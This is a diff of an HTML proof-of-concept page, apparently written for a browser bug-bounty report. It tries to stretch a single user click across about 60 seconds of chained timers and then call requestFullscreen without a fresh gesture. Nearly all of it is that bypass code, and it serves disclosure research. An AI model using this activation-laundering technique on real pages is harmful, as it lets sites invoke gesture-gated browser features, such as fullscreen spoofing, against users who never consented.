@@ -1,96 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>VRP PoC: Infinite Gesture Laundering</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VRP: Multi-Stage Gesture Laundering</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 40px; background: #0f172a; color: #f1f5f9; }
-        #box { border: 1px solid #334155; padding: 30px; display: inline-block; border-radius: 20px; background: #1e293b; box-shadow: 0 10px 25px rgba(0,0,0,0.5); max-width: 90%; }
-        #timer { font-size: 58px; font-weight: 800; margin: 15px 0; color: #38bdf8; font-family: 'Courier New', monospace; }
-        #status { font-size: 18px; margin-bottom: 20px; color: #94a3b8; min-height: 50px; font-weight: 500; }
-        .log-container { background: #020617; border-radius: 10px; padding: 15px; text-align: left; margin-top: 20px; font-size: 12px; font-family: monospace; color: #4ade80; max-height: 150px; overflow-y: auto; border: 1px solid #1e293b; }
-        button { padding: 20px 40px; font-size: 18px; font-weight: bold; cursor: pointer; background: #2563eb; color: white; border: none; border-radius: 14px; transition: 0.3s; width: 100%; }
-        button:active { transform: scale(0.98); }
-        .success { color: #22c55e; font-weight: bold; border: 2px solid #22c55e; padding: 10px; display: block; margin-top: 10px; border-radius: 10px; background: rgba(34, 197, 94, 0.1); }
-        .fail { color: #ef4444; font-weight: bold; border: 2px solid #ef4444; padding: 10px; display: block; margin-top: 10px; border-radius: 10px; background: rgba(239, 68, 68, 0.1); }
+        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
+        #console { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: auto; }
+        button { background: #0f0; color: #000; border: none; padding: 15px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
+    <h2>[RESEARCH] Gesture Activation Persistence</h2>
+    <div id="console"></div><br>
+    <button id="start">INITIALIZE CHAIN (CLICK TO START)</button>
 
-<div id="box">
-    <h2 style="margin-top:0; color: #f8fafc;">Gesture Laundering Research</h2>
-    <p style="color: #64748b; font-size: 14px;">Targeting Extended Transient Activation Persistence</p>
-    
-    <div id="status">Ready. Click to start the laundering cycle.</div>
-    <div id="timer">0.00s</div>
-    
-    <button id="runTest">START 60s TEST</button>
-    
-    <div class="log-container" id="log">
-        [System] Waiting for user interaction...
-    </div>
-</div>
+    <script>
+        const btn = document.getElementById('start');
+        const con = document.getElementById('console');
+        const T0 = () => performance.now();
+        let startTime;
 
-<script>
-    const btn = document.getElementById('runTest');
-    const timerDisplay = document.getElementById('timer');
-    const statusDisplay = document.getElementById('status');
-    const logDisplay = document.getElementById('log');
-    
-    let start;
-    const targetDuration = 60000; // 60 DETIK (Bisa kamu ubah ke 120000 untuk 2 menit)
-
-    function addLog(msg) {
-        const time = ((performance.now() - start) / 1000).toFixed(2);
-        logDisplay.innerHTML += `<div>[${time}s] ${msg}</div>`;
-        logDisplay.scrollTop = logDisplay.scrollHeight;
-    }
-
-    const laundryCycle = () => {
-        const elapsed = performance.now() - start;
-        
-        if (elapsed < targetDuration) {
-            // "Mencuci" gestur dengan nesting task setiap 500ms
-            addLog("Nesting task... Token persistent.");
-            setTimeout(laundryCycle, 500); 
-        } else {
-            // EKSEKUSI SETELAH DURASI TERLAPURI
-            addLog("Target reached. Invoking sensitive API...");
-            statusDisplay.innerText = "Target reached! Attempting Fullscreen...";
-
-            document.documentElement.requestFullscreen()
-            .then(() => {
-                const finalTime = ((performance.now() - start) / 1000).toFixed(2);
-                statusDisplay.innerHTML = `
-                    <span class="success">
-                        BYPASS SUCCESSFUL!<br>
-                        Duration: ${finalTime} seconds
-                    </span>`;
-                addLog("CRITICAL: Fullscreen granted without recent gesture.");
-            })
-            .catch((e) => {
-                statusDisplay.innerHTML = `<span class="fail">BLOCKED: ${e.message}</span>`;
-                addLog("FAILED: Activation expired.");
-            });
+        function log(msg) {
+            const ts = (T0() - startTime).toFixed(0);
+            con.innerHTML += `[${ts}ms] ${msg}<br>`;
+            con.scrollTop = con.scrollHeight;
         }
-    };
 
-    btn.onclick = () => {
-        start = performance.now();
-        btn.style.display = 'none';
-        statusDisplay.innerText = "Laundering in progress... DO NOT TOUCH.";
-        addLog("Initial interaction captured. Starting recursive chains.");
+        // --- KONFIGURASI TAHAPAN (STAGES) ---
+        // Kita pecah menjadi 10 detik per stage untuk mencapai 60 detik
+        const stages = [10000, 10000, 10000, 10000, 10000, 10000]; 
 
-        // Timer Visual
-        setInterval(() => {
-            if (statusDisplay.innerText.includes("BYPASS") || statusDisplay.innerText.includes("BLOCKED")) return;
-            const now = (performance.now() - start) / 1000;
-            timerDisplay.innerText = `${now.toFixed(2)}s`;
-        }, 50);
+        function executeStage(index) {
+            if (index >= stages.length) {
+                log("<b>FINAL STAGE REACHED.</b> Invoking sensitive API...");
+                document.documentElement.requestFullscreen()
+                    .then(() => log("<span style='color:cyan'>SUCCESS: GESTURE LAUNDERED (60s+)</span>"))
+                    .catch(e => log("<span style='color:red'>EXPIRED: " + e.message + "</span>"));
+                return;
+            }
 
-        laundryCycle();
-    };
-</script>
+            log(`Stage ${index + 1}/${stages.length}: Nesting ${stages[index]}ms task...`);
+            
+            // Kuncinya: Task baru dibuat hanya setelah task sebelumnya selesai
+            setTimeout(() => {
+                executeStage(index + 1);
+            }, stages[index]);
+        }
 
+        btn.onclick = () => {
+            startTime = T0();
+            btn.style.display = 'none';
+            log("User gesture captured. Starting chain...");
+            executeStage(0);
+        };
+    </script>
 </body>
 </html>
